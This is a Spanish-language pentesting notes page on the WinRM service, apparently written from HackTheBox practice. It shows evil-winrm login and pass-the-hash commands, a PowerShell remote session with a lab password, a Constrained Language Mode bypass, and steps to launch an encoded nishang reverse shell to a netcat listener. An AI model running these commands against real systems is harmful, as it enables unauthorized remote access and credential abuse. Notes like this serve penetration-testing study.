---
layout: single
title: winrm
excerpt: "Servicio por el cual los usuarios de windows pueden obtener una consola remote proporcionando credenciales."
date: 2021-12-15
classes: wide
header:
  teaser: /assets/images/Services/service.png
  teaser_home_page: true
  icon: /assets/images/service.png
categories:
  - Service
tags:
  - Windows

---


# Definición
Servicio por el cual los usuarios de windows pueden obtener una consola remote proporcionando credenciales. Estos usuarios tinen que pertenecer al groupo **"Remote Management Users"**.

Por defecto opera en los puertos -> 5985, 5986

## Evil-winrm
Si tenemos credenciales válidas, que hemos comprobado con [Crackmapexec](/Crackmapexec/) y obtenemos "pwned" en winrm.

```bash
evil-winrm -i <ip> -u <user> -p <pass>
```

### Pass-The-Hash
En caso de que tengamos un hash NT podemos aprovechar esta técnica con evil-winrm.

```bash
evil-winrm -i <ip> -u <user> -H <hash>
```


Esta herramienta nos ofrece distinas funciones incorporadas, mediante el comando ```menu``` nos lista todas, entre las que destacan ```upload``` y download ```download``` que para su correcto funcionamiento tienen que utilizarse rutas absolutas.

Cabe destacar que en ocasiones estas funciones propias de evil-winrm fallan.

## Powershell

```bash
pwsh
```
```powershell
$pass = ConvertTo-SecureString 'kittycat1' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('htb.local\k.svensson', $pass)

Enter-PSSession -ComputerName 10.10.10.210 -Credential $cred -Authentication Negotiate
```


## Constrained Language Mode

Nos conecta, pero nos muestra errores, aunque son errores de que no encuentra el comando, `Get-Command` nos muestra qué comandos podemos usar. Esta limitación puede ser porque nos encontramos en un **Constrained Language Mode**. Buscamos como comprobar si estamos limitado en google, 

```powershell
$ExecutionContext.SessionState.LanguageMode
```

Ejecutamos el comando para comprobarlo y vemos que estamos limitados. Toca bypassearlo. 

Para bypassear el CLM, creamos una función y la ejecutamos.

```powershell
function location{ Get-Location }; location
```

Y bypasseado. Aunque para escapar del contexto y operar cómodamente, nos ponemos en escucha con nc y rlwrap. Para este caso, utilizamos el repositorio de nishang. Y utilizamos el **Invoke-PowerShellTcpOnelLine.ps1**, nos copiamos la 3ª linea comentada, cambiamos la ip y jugamos con base64 para enviarlo. Pero al ser windows tenemos que aplicar un tratamiento no visible a simple vista.

```bash
cat data | iconv -t utf-16le | base64 -w 0;echo
```

Bajo un script block en la consola powershell con CLM:

```powershell
&{ powershell -enc <data>}
```


---

Escrito el 07-12-2021 a las 06:05 pm por creep33.
